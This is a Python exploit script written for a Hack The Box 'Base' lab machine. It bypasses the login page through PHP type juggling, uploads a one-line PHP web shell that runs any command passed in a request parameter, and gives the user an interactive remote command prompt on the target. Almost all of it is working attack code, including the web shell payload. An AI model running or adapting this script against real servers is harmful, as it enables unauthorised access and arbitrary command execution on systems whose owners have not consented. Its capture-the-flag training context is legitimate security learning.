#!/usr/bin/python3
import requests
import sys
import os
import urllib3
import re

requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

class Interface ():
    def __init__ (self):
        self.red = '\033[91m'
        self.green = '\033[92m'
        self.white = '\033[37m'
        self.yellow = '\033[93m'
        self.bold = '\033[1m'
        self.end = '\033[0m'

    def header(self):
        print('\n    >> Remote Code Execution (RCE) - Starting Point Base HTB')
        print('    >> by twseptian\n')

    def info (self, message):
        print(f"[{self.white}*{self.end}] {message}")

    def warning (self, message):
        print(f"[{self.yellow}!{self.end}] {message}")

    def error (self, message):
        print(f"[{self.red}x{self.end}] {message}")

    def success (self, message):
        print(f"[{self.green}âœ“{self.end}] {self.bold}{message}{self.end}")

# Instantiate our interface class
global output
output = Interface()
output.header()

proxies = {'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'}
s = requests.Session()

def bypass_login_page(url):
    uri = "/login/login.php"
    headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Content-Type": "application/x-www-form-urlencoded", "Connection": "close","Upgrade-Insecure-Requests": "1"}
    data = {"username": "admin", "password[]": "password"}
    response = s.post(url+uri, headers=headers, data=data, verify=False, proxies=proxies,allow_redirects=True)
    login_acces = response.status_code
    if login_acces == 200:
        return True
    else:
        return False

def upload_shell(url):
    output.info("Uploading PHP Shell...")
    phpshell = {'image': ( 'shell.php', '<?php echo shell_exec($_REQUEST["cmd"]); ?>', 'application/octet-stream',{'Content-Disposition': 'form-data'})}
    response = s.post(url+'/upload.php',files=phpshell,proxies=proxies)
    file_upload = response.status_code
    if file_upload == 200:
        return True
    else:
        return False

def webshell(url):
    try:
        WEB_SHELL = url+'/_uploaded/shell.php'
        getdir = {'cmd': 'echo CMD'}
        r2 = requests.get(WEB_SHELL, params=getdir, verify=False, proxies=proxies)
        status = r2.status_code
        if status != 200:
            output.error("Couldn't connect to the webshell")
            r2.raise_for_status()
        output.success("Successfully connected to webshell.")
        cwd = re.findall('[CDEF].*', r2.text)
        cwd = "\033[91m"+cwd[0]+"\033[0m> "
        term = cwd
        while True:
            thought = input(term)
            command = {'cmd': thought}
            r2 = requests.get(WEB_SHELL, params=command, verify=False)
            status = r2.status_code
            if status != 200:
                r2.raise_for_status()
            response2 = r2.text
            print(response2)
    except:
        print("\r\n"); output.warning("Existing.")
        sys.exit(-1)

def main():
    if len(sys.argv) !=2:
        output.info("Usage: %s <url>" % sys.argv[0])
        output.info("Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)
    
    url = sys.argv[1]
    output.info("Bypass Login page using PHP Juggling...")
    login_access = bypass_login_page(url)
    if login_access:
        output.success("Get Login Access")
        file_upload = upload_shell(url)
        if file_upload:
            output.success("PHP Shell has been uploaded successfully")
            webshell(url)
        else:
            output.error("Failed to upload PHP Shell")
    else:
        output.error("Failed to bypass login page")

if __name__ == "__main__":
    main()